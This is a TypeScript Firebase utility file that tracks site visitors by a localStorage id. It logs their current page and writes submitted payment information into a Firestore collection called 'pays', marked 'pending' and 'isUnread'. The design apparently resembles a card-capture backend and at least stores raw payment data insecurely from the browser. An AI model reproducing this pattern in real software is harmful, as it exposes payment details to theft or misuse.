import { getApp, getApps, initializeApp } from 'firebase/app';
import { getDatabase } from 'firebase/database';
import { doc, getFirestore, setDoc} from 'firebase/firestore';

const firebaseConfig = {
   apiKey: "AIzaSyBCKS2SpibTAzFUm_1tqB-8-OuH5cse-8k",
  authDomain: "fbcasf-4a75e.firebaseapp.com",
  databaseURL: "https://fbcasf-4a75e-default-rtdb.firebaseio.com",
  projectId: "fbcasf-4a75e",
  storageBucket: "fbcasf-4a75e.firebasestorage.app",
  messagingSenderId: "917743303180",
  appId: "1:917743303180:web:5a455e3889098e57af0c29",
  measurementId: "G-TT505C1Y1D"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const db = getFirestore(app);
const database = getDatabase(app);

export async function getData(id: string) {
  try {
    const { getDoc, doc } = await import('firebase/firestore');
    const docRef = doc(db, 'pays', id);
    const docSnap = await getDoc(docRef);
    
    if (docSnap.exists()) {
      return docSnap.data();
    } else {
      return null;
    }
  } catch (e) {
    console.error('Error getting document: ', e);
    return null;
  }
}

/**
 * @deprecated This function is no longer used. Use addToHistory from history-utils instead.
 * This function pollutes history with full page data instead of specific entries.
 */
export async function saveToHistory(visitorID: string, step: number) {
  console.warn('saveToHistory is deprecated and should not be used')
  return // Disabled - function body kept for reference only
  /*
  try {
    const currentData = await getData(visitorID);
    
    if (!currentData) {
      console.log('No current data to save to history');
      return;
    }
    
    const { history, ...dataToSave } = currentData as any;
    
    const historyEntry = {
      timestamp: new Date().toISOString(),
      step: step,
      data: dataToSave
    };
    
    const existingHistory = currentData.history || [];
    
    const updatedHistory = [...existingHistory, historyEntry];
    
    await addData({
      id: visitorID,
      history: updatedHistory
    });
    
    console.log('Saved to history:', historyEntry);
  } catch (e) {
    console.error('Error saving to history: ', e);
  }
  */
}

export async function addData(data: any) {
  localStorage.setItem('visitor', data.id);
  try {
    const docRef = await doc(db, 'pays', data.id!);
    await setDoc(docRef, { 
      ...data, 
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
      isUnread: true  // Mark as unread whenever data is updated
    }, {merge:true});

    console.log('Document written with ID: ', docRef.id);
  } catch (e) {
    console.error('Error adding document: ', e);
  }
}

export const handleCurrentPage=(page:string)=>{
const visitorId=localStorage.getItem('visitor')
addData({id:visitorId,currentPage:page})
}
export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
  try {
    const visitorId = localStorage.getItem('visitor');
    if (visitorId) {
      const docRef = doc(db, 'pays', visitorId);
      await setDoc(
        docRef,
        { ...paymentInfo, status: 'pending' },
        { merge: true }
      );
      setPaymentInfo((prev: any) => ({ ...prev, status: 'pending' }));
    }
  } catch (error) {
    console.error('Error adding document: ', error);
    alert('Error adding payment info to Firestore');
  }
};
export { db, database, setDoc, doc };
